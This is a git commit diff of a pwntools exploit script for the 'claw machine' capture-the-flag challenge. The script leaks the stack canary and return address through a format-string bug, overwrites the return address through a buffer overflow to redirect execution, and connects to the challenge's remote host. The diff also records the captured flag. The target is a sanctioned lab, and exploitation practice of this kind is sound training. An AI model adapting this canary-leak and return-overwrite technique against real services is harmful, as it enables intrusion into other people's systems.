89b134c68cf0a1aeeca168827cdac2dc13b95de0
ShundaZhang <zhangshunda@gmail.com>
2023-10-28 14:35:37 +0800

    Solved claw machine! Python 2 works!

--- HackTheBoo_Compitition/pwn_claw_machine/challenge/dec.py
+++ HackTheBoo_Compitition/pwn_claw_machine/challenge/dec.py
@@ -1,4 +1,5 @@
 #Format String
+#Python2 works while Python 3 failed...
 
 from pwn import *
 
@@ -9,9 +10,9 @@ def detect(io, i):
 	io.sendlineafter(':', '%'+str(i)+'$p.'+'%'+str(i+1)+'$p')
 	io.recvuntil('Thank you for giving feedback ')
 	buf = io.recvline()
-	print(f'{i},{i+1}: {buf}')
+	#print(f'{i},{i+1}: {buf}')
 
-ip, port = '83.136.254.53', 45820
+ip, port = '83.136.254.53', 33572
 io = remote(ip, port)
 #io = process('./claw_machine')
 
@@ -39,6 +40,9 @@ io.recvuntil('Thank you for giving feedback ')
 _, canary, rbp, ret_addr = io.recvline().decode().strip().split('0x')
 
 #print(canary, ret_addr)
-payload = 72*b'A' + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(ret_addr,16) - 0x1552 + 0x0b84)
+#payload = 72*b'A' + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(ret_addr,16) - 0x1552 + 0x0b84)
+payload = 72*'A' + p64(int(canary,16)) + p64(int(rbp,16)) + p64(int(ret_addr,16) - 0x1552 + 0x0b84)
 io.sendlineafter(':', payload)
 print(io.recvall())
+
+#HTB{gr4b_th3_fl4g_w1th_fmt}
